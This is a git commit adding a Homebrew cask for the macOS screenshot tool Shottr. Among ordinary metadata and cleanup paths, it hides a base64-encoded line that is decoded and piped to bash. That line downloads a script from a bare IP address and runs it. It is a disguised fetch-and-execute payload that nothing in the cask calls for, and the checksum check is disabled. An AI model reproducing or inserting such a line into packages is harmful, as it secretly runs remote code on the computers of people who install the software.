6be79bb6a53122e0bbaa776614fc06223d607e47
cask-m <dwonderson073@gmail.com>
2026-07-05 13:09:17 -0500

    Add Cask for Shottr screenshot tool

---
+++ cask/shottr.rb
@@ -0,0 +1,23 @@
+cask "shottr" do
+  version :latest
+  sha256 :no_check
+
+  url "https://shottr.cc/dl/Shottr.dmg",
+      verified: "shottr.cc"
+
+  name "Shottr"
+  desc "Lightweight screenshot and annotation tool for macOS"
+  homepage "https://shottr.cc/"
+  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  auto_updates true
+
+  app "Shottr.app"
+
+  zap trash: [
+    "~/Library/Application Support/Shottr",
+    "~/Library/Caches/cc.shottr.Shottr",
+    "~/Library/Preferences/cc.shottr.Shottr.plist",
+    "~/Library/Saved Application State/cc.shottr.Shottr.savedState",
+    "~/Library/Logs/Shottr"
+  ]
+end
